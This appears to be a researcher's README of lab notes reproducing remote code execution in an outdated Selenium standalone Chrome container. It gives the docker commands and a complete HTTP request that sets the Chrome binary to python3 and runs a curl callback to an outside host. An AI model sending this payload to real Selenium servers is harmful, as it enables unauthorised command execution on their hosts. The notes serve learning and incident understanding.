# selenium_code_exec_notes
Selenium Chrome 3.141.59 code exec notes

Note: this is not anything new. This repo just contains notes.

I was researching weird code execution alert in a selenium docker container. 
I'm surprised someone is running the old versions in 2024 and i'm even more suprised that someone is targeting this.

I started researching what the vuln could be and came across the following resources:
- https://www.reddit.com/r/selfhosted/comments/12drr31/remote_server_compromised/ - reddit user discussing similar incident
- https://pixeldrain.com/u/durDp8dh - logs from the reddit user above. shows "goog:chromeOptions" and "binary" used to execute python
- https://www.exploit-db.com/exploits/49915 - exploit 
- https://www.cybersecurity-help.cz/vdb/SB2021060114 - vuln info
- https://www.gabriel.urdhr.fr/2022/02/07/selenium-standalone-server-csrf-dns-rebinding-rce/ - This helped a lot! This pretty much shows the similar execution to the execution seen by the reddit user.


For fun/learning, I wanted to replicate it in my lab.

# running the container
```
docker pull selenium/standalone-chrome-debug:3.141.59-20210929 
docker run --rm -p 4444:4444 selenium/standalone-chrome-debug:3.141.59-20210929
```

Container running:

![image](https://github.com/BoredHackerBlog/selenium_code_exec_notes/assets/38662926/48a72575-1954-41c5-a353-03024e68a8d0)

poc execution:

![image](https://github.com/BoredHackerBlog/selenium_code_exec_notes/assets/38662926/28cc34d1-5538-4d58-921f-3e0b8a30766e)

curl request to my server:

![image](https://github.com/BoredHackerBlog/selenium_code_exec_notes/assets/38662926/66dc8e2f-ef7c-4de7-88a4-c810660c6c9d)

docker logs:

![image](https://github.com/BoredHackerBlog/selenium_code_exec_notes/assets/38662926/6b43c002-a9a8-4fba-b978-f334aab810c9)

HTTP request:
```
POST /wd/hub/session HTTP/1.1
Host: localhost:4444
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: text/plain
Content-Length: 199

{"capabilities": {"alwaysMatch": {"browserName": "chrome", "goog:chromeOptions": {"binary": "/usr/bin/python3", "args": ["-cimport os;os.system('curl http://192.168.42.130:8080/from_container')"]}}}
```

![image](https://github.com/BoredHackerBlog/selenium_code_exec_notes/assets/38662926/3f45571a-4ba7-4ad8-a0f9-6adf62876606)
